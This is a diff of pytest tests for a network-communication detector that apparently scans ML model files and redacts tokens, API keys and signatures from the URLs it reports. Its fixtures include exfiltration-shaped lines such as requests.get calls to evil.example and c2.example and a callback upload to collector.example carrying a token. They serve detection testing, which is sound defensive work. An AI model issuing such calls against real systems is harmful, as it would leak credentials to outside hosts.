@@ -269,6 +269,36 @@ class TestNetworkCommDetector:
         assert network_finding["snippet"] == "requests.get https://evil.example/path;api_key;<redacted>/model.bin"
         assert path_token not in serialized
 
+    @pytest.mark.parametrize(
+        ("path", "safe_path"),
+        [
+            ("path&api_key&SECRET123", "path&api_key&<redacted>"),
+            ("path%26api_key%26SECRET123", "path&api_key&<redacted>"),
+            ("path,api_key,SECRET123", "path,api_key,<redacted>"),
+        ],
+    )
+    def test_boundary_path_key_value_parts_are_redacted(self, path: str, safe_path: str) -> None:
+        """Boundary-separated sensitive keys must redact the following low-entropy value."""
+        data = f"requests.get('https://evil.example/{path}/model.bin')".encode()
+
+        findings = NetworkCommDetector().scan(data, "metadata.py")
+        serialized = json.dumps(findings, sort_keys=True)
+        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
+        network_finding = next(finding for finding in findings if finding["type"] == "network_function")
+
+        assert url_finding["url"] == f"https://evil.example/{safe_path}/model.bin"
+        assert network_finding["snippet"] == f"requests.get https://evil.example/{safe_path}/model.bin"
+        assert "SECRET123" not in serialized
+
+    def test_boundary_path_key_near_match_preserves_following_value(self) -> None:
+        """Non-sensitive boundary components must not redact ordinary following path data."""
+        url = "https://evil.example/path&api_keyboard&SECRET123/model.bin"
+
+        findings = NetworkCommDetector().scan(url.encode(), "metadata.txt")
+        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
+
+        assert url_finding["url"] == url
+
     def test_encoded_path_parameter_tokens_are_redacted(self) -> None:
         """Encoded matrix delimiters should still expose path parameter tokens."""
         detector = NetworkCommDetector()
@@ -731,6 +761,15 @@ class TestNetworkCommDetector:
         assert cloud_finding["url"] == "wasbs://account.blob.core.windows.net/model.bin"
         assert "user%3ASECRET" not in json.dumps(cloud_finding, sort_keys=True)
 
+    def test_wasb_container_shaped_userinfo_on_non_azure_host_is_stripped(self) -> None:
+        """Azure schemes must not preserve userinfo on unrelated hosts."""
+        url = "wasbs://accesskey@example.com/model.bin"
+
+        redacted = network_comm.redact_url_for_finding(url)
+
+        assert redacted == "wasbs://example.com/model.bin"
+        assert "accesskey" not in redacted
+
     def test_gcs_api_bucket_names_are_preserved(self) -> None:
         """GCS JSON/download API bucket segments live after /b/ rather than at path index 1."""
         detector = NetworkCommDetector()
@@ -778,10 +817,11 @@ class TestNetworkCommDetector:
 
         assert url_finding["url"] == f"https://huggingface.co/org/repo/resolve/main/{filename}"
 
-    def test_github_path_tokens_are_redacted(self) -> None:
+    @pytest.mark.parametrize("prefix", ["ghp", "gho", "ghu", "ghs", "ghr"])
+    def test_github_path_tokens_are_redacted(self, prefix: str) -> None:
         """Known token formats embedded in URL paths should be removed."""
         detector = NetworkCommDetector()
-        github_token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
+        github_token = f"{prefix}_abcdefghijklmnopqrstuvwxyz0123456789"
         data = f"https://raw.githubusercontent.com/org/repo/{github_token}/model.py".encode()
 
         findings = detector.scan(data, "model.pkl")
@@ -806,6 +846,23 @@ class TestNetworkCommDetector:
         url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
 
         assert url_finding["url"] == url
+
+    def test_huggingface_path_tokens_override_repository_preservation(self) -> None:
+        """Known tokens must be redacted even where public repository names are normally preserved."""
+        token = "hf_" + "a" * 34
+        url = f"https://huggingface.co/{token}/repo/resolve/main/model.bin"
+
+        redacted = network_comm.redact_url_for_finding(url)
+
+        assert redacted == "https://huggingface.co/<redacted>/repo/resolve/main/model.bin"
+        assert token not in redacted
+
+    def test_huggingface_path_token_near_miss_is_preserved(self) -> None:
+        """Short hf_-prefixed repository names should remain actionable."""
+        repository_owner = "hf_" + "a" * 29
+        url = f"https://huggingface.co/{repository_owner}/repo/resolve/main/model.bin"
+
+        assert network_comm.redact_url_for_finding(url) == url
 
     def test_benign_short_url_paths_are_preserved(self) -> None:
         """Ordinary URL paths should remain readable after redaction."""
@@ -1152,6 +1209,16 @@ class TestNetworkCommDetector:
         assert "QUERYSECRET" not in snippet
         assert "AFTERSECRET" not in snippet
 
+    def test_network_function_snippets_support_triple_quoted_endpoints(self) -> None:
+        """Triple-quoted call arguments should retain sanitized endpoint context."""
+        data = b"requests.get('''https://c2.example/path?token=QUERYSECRET''')"
+
+        findings = NetworkCommDetector().scan(data, "hook.py")
+        network_finding = next(finding for finding in findings if finding["type"] == "network_function")
+
+        assert network_finding["snippet"] == "requests.get https://c2.example/path"
+        assert "QUERYSECRET" not in json.dumps(network_finding, sort_keys=True)
+
     @pytest.mark.parametrize(
         "data",
         [
@@ -1452,6 +1519,31 @@ class TestNetworkCommDetector:
 
         assert cc_finding["snippet"] == "malware"
 
+    def test_explicit_ml_model_url_patterns_redact_signed_query_material(self) -> None:
+        detector = NetworkCommDetector()
+        token = "TOP_SECRET_QUERY"
+        signature = "SIGSECRET1234567890"
+        data = f"callback = 'https://collector.example/upload?token={token}&X-Amz-Signature={signature}'".encode()
+
+        findings = detector.scan(data, "payload.pt")
+
+        explicit_finding = next(finding for finding in findings if finding["type"] == "explicit_network_pattern")
+        serialized = json.dumps(explicit_finding, sort_keys=True)
+        assert token not in serialized
+        assert signature not in serialized
+        assert explicit_finding["matched_text"] == "https://collector.example/upload"
+        assert explicit_finding["message"] == "Explicit network pattern in ML model: https://collector.example/upload"
+
+    def test_explicit_ml_model_url_patterns_keep_benign_url_context(self) -> None:
+        detector = NetworkCommDetector()
+        data = b"source = https://example.com/models/checkpoint.bin"
+
+        findings = detector.scan(data, "payload.pt")
+
+        explicit_finding = next(finding for finding in findings if finding["type"] == "explicit_network_pattern")
+        assert explicit_finding["matched_text"] == "https://example.com/models/checkpoint.bin"
+        assert explicit_finding["message"].endswith("https://example.com/models/checkpoint.bin")
+
     def test_cc_pattern_snippet_url_expansion_is_bounded(self) -> None:
         """Long whitespace-free binary regions should not force unbounded URL scans."""
         detector = NetworkCommDetector()
@@ -1671,9 +1763,10 @@ class TestNetworkCommDetector:
         assert not [finding for finding in findings if finding["type"] == "suspicious_port"]
         assert "4444" not in json.dumps(findings, sort_keys=True)
 
-    def test_explicit_binary_url_findings_do_not_capture_adjacent_credentials(self) -> None:
+    @pytest.mark.parametrize("quote", ['"', "'"])
+    def test_explicit_binary_url_findings_do_not_capture_adjacent_credentials(self, quote: str) -> None:
         """Binary-context URL matches must not retain compact adjacent arguments."""
-        data = b'requests.get("https://evil.example/path",api_key="TOPSECRET123")'
+        data = f"requests.get({quote}https://evil.example/path{quote},api_key={quote}TOPSECRET123{quote})".encode()
 
         findings = NetworkCommDetector().scan(data, "model.bin")
         explicit_finding = next(finding for finding in findings if finding["type"] == "explicit_network_pattern")
